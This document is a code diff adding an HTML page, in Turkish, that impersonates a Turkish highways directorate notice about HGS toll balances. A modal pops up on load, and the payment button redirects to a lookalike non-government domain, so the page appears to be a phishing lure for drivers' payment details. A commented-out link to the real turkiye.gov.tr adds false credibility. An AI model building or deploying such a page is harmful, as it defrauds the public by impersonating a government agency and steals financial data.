@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!--=============== BOXICONS ===============-->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
+
+    <!--=============== CSS ===============-->
+    <link rel="stylesheet" href="style8.css">
+
+    <title>Responsive Modal Popup Swingcodes</title>
+</head>
+<body>
+
+    <section class="modal container">
+        <!-- Eğer tıklama olmadan sayfa yüklenirken açılmasını istiyorsanız, modal__button'ı gizleyebilirsiniz -->
+        <!-- <button class="modal__button" id="open-modal">Open Modal</button> -->
+
+        <div class="modal__container" id="modal-container">
+            <div class="modal__content">
+    
+
+                <img src="https://shorturl.at/bcfgD" alt="" class="modal__img">
+
+                <h1 class="modal__title">Karayolları Genel Müdürlüğü <br> Duyurular</h1>
+                <p class="modal__description">Karayolları HGS Yükleme Portalı</p>
+                <h3>Sayın Üyemiz;<br></h3>
+                <h5>Ücretli Otoyol veya Ücretli Köprü Geçişlerinde Yeterli Bakiyeniz olmadığında, geçiş tarihini izleyen 15 Gün içerisinde araç plakanıza ait ve plaka numarasına tanımlı HGS Hesabınızdan otomatik olarak bakiye düşülecektir.  </h5><br>
+    
+            <button class="modal__buttoniki modal__button-width" onclick="redirectToPaymentPage()">
+        HGS YÜKLEME ÖDEME YAP
+    </button>
+    <!--
+    <br><br>
+    <button class="modal__button modal__button-width" onclick="redirectToPaymentPagesorgu()">
+        BAKİYE SORGULAMA YAP
+    </button><br><br>
+    -->
+
+            </div>
+        </div>
+    </section>
+    
+
+    <!--=============== MAIN JS ===============-->
+    <script src="main1.js"></script>
+
+    <script>
+        // Sayfa yüklendiğinde modalı aç
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('modal-container').classList.add('open');
+        });
+    </script>
+        <script>
+        function redirectToPaymentPage() {
+            // Sayfayı yönlendirme işlemi için JavaScript'te kullanılan window.location.href'i kullanıyoruz.
+            window.location.href = "https://karayollari-surucumhgsetiketguncelle.net/index.php";
+        }
+    </script>
+            <script>
+        function redirectToPaymentPagesorgu() {
+            // Sayfayı yönlendirme işlemi için JavaScript'te kullanılan window.location.href'i kullanıyoruz.
+            window.location.href = "https://www.turkiye.gov.tr/ptt-hizli-gecis-sistemi-hgs-hesap-bilgileri-sorgulama";
+        }
+    </script>
+</body>
+</html>
